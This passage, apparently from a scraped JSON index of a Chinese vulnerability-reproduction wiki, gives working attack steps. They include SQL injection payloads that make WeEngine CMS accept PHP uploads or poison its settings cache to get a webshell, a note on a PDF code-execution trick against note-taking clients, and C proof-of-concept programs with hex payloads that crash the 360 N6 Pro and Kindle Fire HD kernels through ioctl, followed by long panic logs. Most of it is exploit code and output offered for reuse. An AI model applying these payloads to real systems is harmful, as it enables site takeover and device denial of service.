window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/2.html":{"url":"0day/微擎/2.html","title":"微擎cms v1.8.2 后台getshell","keywords":"","body":"微擎cms v1.8.2 后台getshell 一、漏洞简介 二、漏洞影响 v1.8.2（201812130002） 三、复现过程 站点-附件设置-支持文件后缀 在安装完成的时候,数据库里面并没有写入支持文件后缀的值,需要我们进行添加需要的脚本格式php等等 直接写上支持的后缀为php是会带入到数据库的,提交完毕以后数据库会显示可上传的值 a:3:{s:16:\"attachment_limit\"; i:0;s:5:\"image\";a:5:{s:5:\"thumb\";i:0;s:5: \"width\";i:800;s:10:\"extentions\"; a:4:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"png\";} s:5:\"limit\";i:5000;s:14:\"zip_percentage\";s:3:\"100\";} s:5:\"audio\";a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 漏洞利用 写入任意字符 a:3:{s:16:\"attachment_limit\";i:0;s:5:\"image\"; a:5:{s:5:\"thumb\";i:0;s:5:\"width\";i:800;s:10:\"extentions\"; a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"aaa\";}s:5:\"limit\";i:5000; s:14:\"zip_percentage\";s:3:\"100\";}s:5:\"audio\"; a:2:{s:10:\"extentions\"; a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 站点-常用工具-数据库-执行SQL语句替换之前插入的值 (记得打开调试模式) UPDATE ims_core_settings SET value = replace(value, 'aaa', 'php ') 注意php后有一个空格 or 如果在渗透过程中有SQL注入点的情况下 有用户权限能够上传,尝试直接在SQLMAP执行语句 UPDATE `ims_core_settings` SET `key` = 'upload', `value` = 'a:2:{s:5:\\\"image\\\";a:4:{s:5:\\\"thumb\\\";i:0; s:5:\\\"width\\\";i:800;s:10:\\\"extentions\\\"; a:5:{i:0;s:3:\\\"gif\\\";i:1;s:3:\\\"jpg\\\";i:2; s:4:\\\"jpeg\\\";i:3; s:3:\\\"png\\\";i:4;s:3:\\\"php \\\";} s:5:\\\"limit\\\";i:5000;}s:5:\\\"audio\\\"; a:2:{s:10:\\\"extentions\\\";a:1:{i:0;s:3:\\\"mp3\\\";}s:5:\\\"limit\\\";i:5000;}}' WHERE `key` = 'upload' AND `key` = 'upload' COLLATE utf8mb4_bin; a:3:{s:16:\"attachment_limit\";i:0;s:5:\"image\"; a:5:{s:5:\"thumb\";i:0;s:5:\"width\";i:800;s:10:\"extentions\"; a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"php \";}s:5:\"limit\";i:5000; s:14:\"zip_percentage\";s:3:\"100\";}s:5:\"audio\"; a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 执行完毕-系统-更新缓存 上传php文件 以上全部操作完毕,直接在可以上传图片的地方进行上传脚本 四、参考链接 https://www.vulnbug.com/Exploit/getshell-vulnerability-in-microcomputer-cms-background.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-17 14:43:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/4.html":{"url":"0day/微擎/4.html","title":"微擎cms v2.1.2 后台getshell","keywords":"","body":"微擎cms v2.1.2 后台getshell 一、漏洞简介 需要登录后台，并且有高权限。 二、漏洞影响 v2.1.2 三、复现过程 这个洞首先需要一个高权账号。 问题出在模板解析这里(template.func.php)。 attachurl_remote来自于后台的设置,但是有一层htmlspecialchars 但是恰巧微擎支持SQL操作,虽然有些绿化版本的把SQL提交按钮和TOKEN值隐藏了,但是由于微擎一个页面做了多个CASE,所以可以数据表优化处找到TOKEN 这样就可以愉快的修改SQL了,然后会发现微擎存在一个缓存表,同时remote这边的设置做了序列化(其实这个也可以利用),就可以构造如下 POC sql=DELETE from ims_core_cache;update ims_core_settings set `value` ='a:5:{s:4:\"type\";i:1;s:6:\"alioss\";a:4:{s:3:\"key\";s:0:\"\";s:6:\"secret\";s:0:\"\";s:6:\"bucket\";N;s:8:\"internal\";s:1:\"0\";}s:3:\"ftp\";a:9:{s:3:\"ssl\";i:1;s:4:\"host\";s:9:\"127.0.0.1\";s:4:\"port\";s:2:\"21\";s:8:\"username\";s:4:\"root\";s:8:\"password\";s:4:\"root\";s:4:\"pasv\";i:0;s:3:\"dir\";s:10:\"127.0.0.11\";s:3:\"url\";s:28:\"127.0.0.1?\";s:8:\"overtime\";i:0;}s:5:\"qiniu\";a:4:{s:9:\"accesskey\";s:0:\"\";s:9:\"secretkey\";s:0:\"\";s:6:\"bucket\";s:0:\"\";s:3:\"url\";s:0:\"\";}s:3:\"cos\";a:6:{s:5:\"appid\";s:0:\"\";s:8:\"secretid\";s:0:\"\";s:9:\"secretkey\";s:0:\"\";s:6:\"bucket\";s:0:\"\";s:5:\"local\";s:0:\"\";s:3:\"url\";s:0:\"\";}}' where `key`=\"remote\";&token=9def73ec&submit=submit 最后刷新缓存然后打开有加载footer的页面就能getshell了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-17 14:54:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/有道云笔记/1.html":{"url":"0day/有道云笔记/1.html","title":"有道云笔记/印象笔记 windows客户端代码执行&本地文件读取","keywords":"","body":"有道云笔记/印象笔记 windows客户端代码执行&本地文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 构造一个pdf，UF处是执行的地方，输入iexplore表示打开ie 在客户端上传就会触发： 打开cmd 用到的pdf： 改/UF (iexplore)即可： /F（cmd）不用理会，这个是我测试的时候乱插的 具体技术详情不说了，感兴趣的搜索关键字“pdf漏洞“”pdf脚本执行” 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 19:03:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/默认设备密码/默认设备密码.html":{"url":"iot/默认设备密码/默认设备密码.html","title":"默认设备密码","keywords":"","body":"默认设备密码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 17:17:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/360/360 Phone N6 Pro.html":{"url":"iot/360/360 Phone N6 Pro.html","title":"360 Phone N6 Pro内核漏洞","keywords":"","body":"360 Phone N6 Pro内核漏洞 一、漏洞简介 360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令3235427072在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。 二、漏洞影响 名称：360 Phone N6 Pro 型号：1801-A01 安卓版本：7.1.1 版本号：V096 内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64 三、复现过程 poc /* * This is poc of 360 N6 Pro, 1801-A01 * Android Version: 7.1.1 * Version Number: V096 * Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64 * A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072. * This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb. */ #include #include #include #include const static char *driver = \"/dev/block/mmcblk0rpmb\"; static command = 3235427072; // 0xc0d8b300 int main(int argc, char **argv, char **env) { int fd = 0; fd = open(driver, O_RDWR); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try ioctl device file '%s', with command 0x%x and payload NULLn\", driver, command); printf(\"System will crash and reboot.n\"); if(ioctl(fd, command, NULL) /data/local/tmp/log\"); return -1; } close(fd); return 0; } 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:24:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Amazon Kindle Fire HD/CVE-2018-11019.html":{"url":"iot/Amazon Kindle Fire HD/CVE-2018-11019.html","title":"（CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","keywords":"","body":"（CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 一、漏洞简介 Amazon Kindle Fire HD（3rd）是美国亚马逊（Amazon）公司的一款Fire OS平板电脑设备。Fire OS是运行在其中的一套专用于Amazon设备的基于Android开发的移动操作系统。kernel是其中的一个内核组件。 Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3版本中的kernel组件的kernel/omap/drivers/misc/gcx/gcioctl/gcif.c文件存在安全漏洞。攻击者可借助3221773726命令利用该漏洞注入特制的参数，造成内核崩溃。 二、漏洞影响 Fire OS 4.5.5.3 三、复现过程 poc /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517. * Related buggy struct name is dsscomp_setup_dispc_data. * This Poc should run with permission to do ioctl on /dev/dsscomp. * * The fowllwing is kmsg of kernel crash infomation: * * */ #include #include #include #include const static char *driver = \"/dev/dsscomp\"; static command = 1118064517; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0xffffffff, 0x00000003, 0x5d200040, 0x79900008, 0x8f5928bd, 0x78b02422, 0x00000000, 0xffffffff, 0xf4c50400, 0x007fffff, 0x8499f562, 0xffff0400, 0x001b131d, 0x60818210, 0x00000007, 0xffffffff, 0x00000000, 0x9da9041c, 0xcd980400, 0x001f03f4, 0x00000007, 0x2a34003f, 0x7c80d8f3, 0x63102627, 0xc73643a8, 0xa28f0665, 0x00000000, 0x689e57b4, 0x01ff0008, 0x5e7324b1, 0xae3b003f, 0x0b174d86, 0x00000400, 0x21ffff37, 0xceb367a4, 0x00000040, 0x00000001, 0xec000f9e, 0x00000001, 0x000001ff, 0x00000000, 0x00000000, 0x0000000f, 0x0425c069, 0x038cc3be, 0x0000000f, 0x00000080, 0xe5790100, 0x5b1bffff, 0x0000d355, 0x0000c685, 0xa0070000, 0x0010ffff, 0x00a0ff00, 0x00000001, 0xff490700, 0x0832ad03, 0x00000006, 0x00000002, 0x00000001, 0x81f871c0, 0x738019cb, 0xbf47ffff, 0x00000040, 0x00000001, 0x7f190f33, 0x00000001, 0x8295769b, 0x0000003f, 0x869f2295, 0xffffffff, 0xd673914f, 0x05055800, 0xed69b7d5, 0x00000000, 0x0107ebbd, 0xd214af8d, 0xffff4a93, 0x26450008, 0x58df0000, 0xd16db084, 0x03ff30dd, 0x00000001, 0x209aff3b, 0xe7850800, 0x00000002, 0x30da815c, 0x426f5105, 0x0de109d7, 0x2c1a65fc, 0xfcb3d75f, 0x00000000, 0x00000001, 0x8066be5b, 0x00000002, 0xffffffff, 0x5cf232ec, 0x680d1469, 0x00000001, 0x00000020, 0xffffffff, 0x00000400, 0xd1d12be8, 0x02010200, 0x01ffc16f, 0xf6e237e6, 0x007f0000, 0x01ff08f8, 0x000f00f9, 0xbad07695, 0x00000000, 0xbaff0000, 0x24040040, 0x00000006, 0x00000004, 0x00000000, 0xbc2e9242, 0x009f5f08, 0x00800000, 0x00000000, 0x00000001, 0xff8800ff, 0x00000001, 0x00000000, 0x000003f4, 0x6faa8472, 0x00000400, 0xec857dd5, 0x00000000, 0x00000040, 0xffffffff, 0x3f004874, 0x0000b77a, 0xec9acb95, 0xfacc0001, 0xffff0001, 0x0080ffff, 0x3600ff03, 0x00000001, 0x8fff7d7f, 0x6b87075a, 0x00000000, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x001001ff, 0x00000000, 0x00000001, 0xff1f0512, 0x00000001, 0x51e32167, 0xc18c55cc, 0x00000000, 0xffffffff, 0xb4aaf12b, 0x86edfdbd, 0x00000010, 0x0000003f, 0xabff7b00, 0xffff9ea3, 0xb28e0040, 0x000fffff, 0x458603f4, 0xffff007f, 0xa9030f02, 0x00000001, 0x002cffff, 0x9e00cdff, 0x00000004, 0x41414141, 0x41414141, 0x41414141, 0x41414141 }; int fd = 0; fd = open(driver, O_RDWR); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try open %s with command 0x%x.\\n\", driver, command); printf(\"System will crash and reboot.\\n\"); if(ioctl(fd, command, &payload) /data/local/tmp/log\"); return -1; } close(fd); return 0; } 崩溃日志 [ 164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037 [ 164.802459] pgd = c26ec000 [ 164.805664] [00000037] *pgd=82f42831, *pte=00000000, *ppte=00000000 [ 164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM [ 164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O) [ 164.827239] CPU: 1 Tainted: G O (3.4.83-gd2afc0bae69 #1) [ 164.834686] PC is at dev_ioctl+0x4ac/0x10c4 [ 164.839416] LR is at down_timeout+0x40/0x5c [ 164.844146] pc : [] lr : [] psr: 60000013 [ 164.844146] sp : c25a1e70 ip : c25a1e50 fp : c25a1f04 [ 164.857116] r10: 00000000 r9 : d8c0aca8 r8 : bed5c610 [ 164.863128] r7 : c0a25b50 r6 : c25a0000 r5 : bed5c610 r4 : 0000000f [ 164.870391] r3 : 00001403 r2 : 00000000 r1 : 20000013 r0 : 00000000 [ 164.877807] Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user [ 164.885894] Control: 10c5387d Table: 826ec04a DAC: 00000015 [ 164.892303] [ 164.892333] PC: 0xc0317868: [ 164.897308] 7868 30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f [ 164.907989] 7888 e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 [ 164.918670] 78a8 e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060 [ 164.929351] 78c8 e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0 [ 164.939880] 78e8 e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070 [ 164.950561] 7908 e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064 [ 164.961212] 7928 ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064 [ 164.971771] 7948 e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088 [ 164.982299] [ 164.982330] LR: 0xc006e938: [ 164.987426] e938 e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005 [ 164.997955] e958 e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4 [ 165.008636] e978 e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000 [ 165.019317] e998 e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794 [ 165.029846] e9b8 e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d [ 165.040374] e9d8 e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008 [ 165.051055] e9f8 e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004 [ 165.061737] ea18 e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d [ 165.072265] [ 165.072265] SP: 0xc25a1df0: [ 165.077362] 1df0 00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff [ 165.087890] 1e10 c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013 [ 165.098419] 1e30 00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8 [ 165.109100] 1e50 00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff [ 165.119781] 1e70 00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920 [ 165.130340] 1e90 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff [ 165.141021] 1eb0 00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580 [ 165.151702] 1ed0 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610 [ 165.162353] [ 165.162384] IP: 0xc25a1dd0: [ 165.167327] 1dd0 c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001 [ 165.178009] 1df0 00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff [ 165.188537] 1e10 c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013 [ 165.199249] 1e30 00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8 [ 165.209899] 1e50 00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff [ 165.220581] 1e70 00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920 [ 165.231109] 1e90 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff [ 165.241790] 1eb0 00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580 [ 165.252441] [ 165.252441] FP: 0xc25a1e84: [ 165.257415] 1e84 c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff [ 165.268066] 1ea4 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000 [ 165.278717] 1ec4 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 [ 165.289276] 1ee4 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044 [ 165.299926] 1f04 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440 [ 165.310607] 1f24 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000 [ 165.321136] 1f44 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000 [ 165.331695] 1f64 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400 [ 165.342346] [ 165.342376] R6: 0xc259ff80: [ 165.347320] ff80 00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000 [ 165.358001] ffa0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 165.368682] ffc0 00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000 [ 165.379241] ffe0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 165.389770] 0000 00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00 [ 165.400451] 0020 00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8 [ 165.411132] 0040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000 [ 165.421661] 0060 005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000 [ 165.432342] [ 165.432342] R7: 0xc0a25ad0: [ 165.437316] 5ad0 00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03 [ 165.447875] 5af0 01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005 [ 165.458526] 5b10 01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001 [ 165.469207] 5b30 ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001 [ 165.479736] 5b50 00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000 [ 165.490417] 5b70 00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000 [ 165.500946] 5b90 00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001 [ 165.511627] 5bb0 c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8 [ 165.522186] [ 165.522186] R9: 0xd8c0ac28: [ 165.527282] ac28 d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58 [ 165.537841] ac48 00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148 [ 165.548492] ac68 5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000 [ 165.559020] ac88 00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000 [ 165.569702] aca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400 [ 165.580261] acc8 d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda [ 165.590911] ace8 2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000 [ 165.601593] ad08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24 [ 165.612121] Process gcioctl_poc (pid: 3932, stack limit = 0xc25a02f8) [ 165.619445] Stack: (0xc25a1e70 to 0xc25a2000) [ 165.624359] 1e60: 00000001 00000028 000fffff c25a1ea0 [ 165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 [ 165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 [ 165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 [ 165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 [ 165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 [ 165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 [ 165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 [ 165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 [ 165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8 [ 165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610 [ 165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624 [ 165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000 [ 165.743835] Backtrace: [ 165.746856] [] (dev_ioctl+0x0/0x10c4) from [] (do_vfs_ioctl+0x8c/0x5b4) [ 165.756256] [] (do_vfs_ioctl+0x0/0x5b4) from [] (sys_ioctl+0x74/0x84) [ 165.765502] [] (sys_ioctl+0x0/0x84) from [] (ret_fast_syscall+0x0/0x30) [ 165.774780] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638 [ 165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) [ 165.793060] Board Information: [ 165.793060] Revision : 0001 [ 165.793060] Serial : 0000000000000000 [ 165.793090] SoC Information: [ 165.793090] CPU : OMAP4470 [ 165.793090] Rev : ES1.0 [ 165.793121] Type : HS [ 165.793121] Production ID: 0002B975-000000CC [ 165.793121] Die ID : 1CC60000-50002FFF-0B00935D-11007004 [ 165.793121] [ 165.844757] ---[ end trace aba846a2af6e75b7 ]--- [ 165.850097] Kernel panic - not syncing: Fatal exception [ 165.856109] CPU0: stopping [ 165.859252] Backtrace: [ 165.862274] [] (dump_backtrace+0x0/0x10c) from [] (dump_stack+0x18/0x1c) [ 165.871643] r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950 [ 165.878784] [] (dump_stack+0x0/0x1c) from [] (handle_IPI+0x190/0x1c4) [ 165.887908] [] (handle_IPI+0x0/0x1c4) from [] (gic_handle_irq+0x58/0x60) [ 165.897399] [] (gic_handle_irq+0x0/0x60) from [] (__irq_svc+0x40/0x70) [ 165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80) [ 165.912384] fc20: c153a9f8 00000000 [ 165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f [ 165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff [ 165.940032] r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4 [ 165.947052] [] (follow_page+0x0/0x238) from [] (__get_user_pages+0x13c/0x3f0) [ 165.957031] [] (__get_user_pages+0x0/0x3f0) from [] (get_user_pages+0x50/0x58) [ 165.967102] [] (get_user_pages+0x0/0x58) from [] (get_user_pages_fast+0x64/0x7c) [ 165.977233] r4:d8caee3c [ 165.980468] [] (get_user_pages_fast+0x0/0x7c) from [] (fuse_copy_fill+0x1bc/0x238) [ 165.990905] [] (fuse_copy_fill+0x0/0x238) from [] (fuse_copy_one+0x38/0x68) [ 166.000579] r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000 [ 166.007690] [] (fuse_copy_one+0x0/0x68) from [] (fuse_dev_do_read+0x3e4/0x69c) [ 166.017761] r4:dd243c00 [ 166.020874] [] (fuse_dev_do_read+0x0/0x69c) from [] (fuse_dev_read+0x84/0x9c) [ 166.030853] [] (fuse_dev_read+0x0/0x9c) from [] (do_sync_read+0xb0/0xf0) [ 166.040222] r7:00000000 r6:00000000 r5:00000000 r4:00000000 [ 166.047363] [] (do_sync_read+0x0/0xf0) from [] (vfs_read+0xa4/0x148) [ 166.056488] [] (vfs_read+0x0/0x148) from [] (sys_read+0x40/0x78) [ 166.065093] r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000 [ 166.073547] [] (sys_read+0x0/0x78) from [] (ret_fast_syscall+0x0/0x30) [ 166.082855] r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010 [ 166.091217] CPU0 PC (0) : 0xc0019b2c [ 166.095397] CPU0 PC (1) : 0xc0019b2c [ 166.099456] CPU0 PC (2) : 0xc0019b2c [ 166.103515] CPU0 PC (3) : 0xc0019b2c [ 166.107574] CPU0 PC (4) : 0xc0019b2c [ 166.111785] CPU0 PC (5) : 0xc0019b2c [ 166.115814] CPU0 PC (6) : 0xc0019b2c [ 166.119873] CPU0 PC (7) : 0xc0019b2c [ 166.124084] CPU0 PC (8) : 0xc0019b2c [ 166.128112] CPU0 PC (9) : 0xc0019b2c [ 166.132171] CPU1 PC (0) : 0xc003ee38 [ 166.136352] CPU1 PC (1) : 0xc003ee54 [ 166.140411] CPU1 PC (2) : 0xc003ee54 [ 166.144470] CPU1 PC (3) : 0xc003ee54 [ 166.148681] CPU1 PC (4) : 0xc003ee54 [ 166.152709] CPU1 PC (5) : 0xc003ee54 [ 166.156768] CPU1 PC (6) : 0xc003ee54 [ 166.160980] CPU1 PC (7) : 0xc003ee54 [ 166.165008] CPU1 PC (8) : 0xc003ee54 [ 166.169067] CPU1 PC (9) : 0xc003ee54 [ 166.173126] [ 166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017 [ 166.175079] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:03:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Amazon Kindle Fire HD/CVE-2018-11020.html":{"url":"iot/Amazon Kindle Fire HD/CVE-2018-11020.html","title":"（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","keywords":"","body":"（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/rpmsg/rpmsg_omx.c允许攻击者通过设备文件/ dev / rpmsg-上的ioctl的参数注入特制的参数使用命令3221772291的omx1，并导致内核崩溃。 要探索此漏洞，必须打开设备文件/ dev / rpmsg-omx1，并使用命令3221772291和精心设计的有效负载作为第三个参数来对该设备文件进行ioctl系统调用。 二、漏洞影响 Fire OS 4.5.5.3 三、复现过程 poc /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291. * Related buggy struct name is gcicommit. * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1. * * The fowllwing is kmsg of kernel crash infomation: * * */ #include #include #include #include const static char *driver = \"/dev/rpmsg-omx1\"; static command = 3221772291; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0xb5d18de2, 0xf6e48a17, 0x9179c429, 0x89a32e03 }; int fd = 0; fd = open(driver, O_RDWR); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try open %s with command 0x%x.\\n\", driver, command); printf(\"System will crash and reboot.\\n\"); if(ioctl(fd, command, &payload) /data/local/tmp/log\"); return -1; } close(fd); return 0; } 崩溃日志 [ 146.290710] Unable to handle kernel paging request at virtual address b5d18de6 [ 146.299438] pgd = d72dc000 [ 146.302795] [b5d18de6] *pgd=00000000 [ 146.307281] Internal error: Oops: 5 [#1] PREEMPT SMP ARM [ 146.313232] Modules linked in: 